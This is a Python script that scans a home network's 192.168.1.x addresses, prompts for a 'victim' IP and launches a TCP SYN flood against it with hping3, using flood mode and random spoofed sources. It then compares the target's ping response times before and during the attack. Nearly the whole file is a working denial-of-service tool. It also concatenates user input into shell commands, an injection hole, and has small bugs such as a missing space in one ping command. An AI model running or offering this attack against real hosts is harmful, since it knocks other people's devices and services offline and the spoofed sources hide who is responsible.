import subprocess
import os
import threading
import time

# For my wifi Router the local addresses it allocates, they begin from 192.168.1.x where 'x' represents some integer from 1-255.
# This is example of ipV4 addressing. As by default routers made for small scale, like routers at our home, they can theoritically give/provide local addresses to a max of 256 devices at a time.

# Pinging all the addresses (Bruteforce Approach), to see who is connected to our network

def ping(i):
	command = ["timeout","5s", "ping","-c","3", "-w", "500","192.168.1."+str(i)]
	return subprocess.call(command)==0
	

connected_ips = []
for i in range(0,10):
	if(ping(i)==1):
		connected_ips.append("192.168.1." + str(i))
	
def print_local_connected_ips() :
	print("The list of all IPs connected to your WiFi Network are:")
	for _ in connected_ips :
		print(_)

print_local_connected_ips()

victim = input("Enter the IP you want to Attack => ")

def pingb4atck():
	global output1
	output1 = subprocess.check_output("ping -c 25 "+victim, shell=True)

def launchSynFloodAttack():
	syn_attack_command = "sudo timeout 150s hping3 -c 2000 -d 1200 -S -w 64 -p 80 --flood --rand-source " + victim
	subprocess.call(syn_attack_command, shell=True)
	
def pingDuringAttack():
	global output2
	command = "ping -c 25" + victim
	output2 = subprocess.check_output(command, shell=True)


# Managing the threading Stuff
t1 = threading.Thread(target=pingb4atck)
t2 = threading.Thread(target=launchSynFloodAttack, daemon=True)
t3 = threading.Thread(target=pingDuringAttack)

print("Analysing Victim's Ping Response Before Attack")
t1.start()
t1.join()

print("Initiating The TCP Syn Flood Attack")
t2.start()
time.sleep(5)

print("Analysing Victim's Performance After Attack")
t3.start()
t3.join()


# Analysing and Printing The outputs (of shell) Below
output1 = str(output1, 'utf-8')
output2 = str(output2, 'utf-8')


#Printing The Final Output
print()
print("The Performance of Victim before Attack =>")
print("Standard Deviation of response Time: "+ output1.split('/')[-1])
print("Average Response Time: " +output1.split('/')[-3]+ " ms")

print()
print("The Performance of Victim During Attack =>")
print("Standard Deviation of response Time: " +output2.split('/')[-1])
print("Average Response Time: " +output2.split('/')[-3]+ " ms")



#print(output1)
#print(output2)
